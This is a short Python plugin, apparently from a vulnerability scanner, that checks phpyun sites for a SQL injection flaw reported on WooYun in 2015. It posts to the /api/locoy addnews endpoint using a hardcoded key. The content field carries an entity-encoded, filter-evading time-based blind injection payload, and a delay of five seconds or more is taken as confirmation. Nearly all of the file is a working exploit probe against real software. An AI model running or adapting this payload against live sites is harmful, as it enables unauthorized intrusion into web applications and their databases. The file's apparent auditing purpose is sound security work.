#!/usr/bin/env python
# coding:utf-8
# title:phpyun Sql_Injection
# author:云絮
# from:http://www.wooyun.org/bugs/wooyun-2015-0127257
# date:2015-10-22
import re
import time
from random import randint
def assign(service, arg):
    if service == "phpyun":
        return True, arg

def audit(arg):
    url = arg+'/api/locoy/index.php?m=news&c=addnews&key=phpyun'
    post='title='+str(randint(1111,9999))+'yunxu'+'&content=abc&nid=5671&keyword=xxxxxx'
    startTime=time.time()
    code1,head1,res1,errcode1,_= curl.curl2(url,post=post)
    endTime=time.time()
    resTime1=endTime-startTime
    post1='title='+str(randint(1111,9999))+'yunxu'+'&content=%26%2349%3B%26%2339%3B%26%2342%3B%26%23105%3B%26%2332%3B%26%23102%3B%26%2340%3B%26%2349%3B%26%2361%3B%26%2349%3B%26%2344%3B%26%23115%3B%26%23108%3B%26%23101%3B%26%23101%3B%26%2332%3B%26%23112%3B%26%2340%3B%26%2353%3B%26%2341%3B%26%2344%3B%26%2349%3B%26%2341%3B%26%2335%3B&nid=5671&keyword=xxxxxx'

    startTime2=time.time()
    code2,head2,res2,errcode2,_= curl.curl2(url,post=post1)
    endTime2=time.time()
    resTime2=endTime2-startTime2
    if code1==200 and code2==200 and resTime2>=5 and resTime2 > resTime1:
        security_hole(url + ' :SQL Injection')

if __name__ == '__main__':
    from dummy import *
    audit(assign('phpyun', 'http://localhost/pyun/')[1])
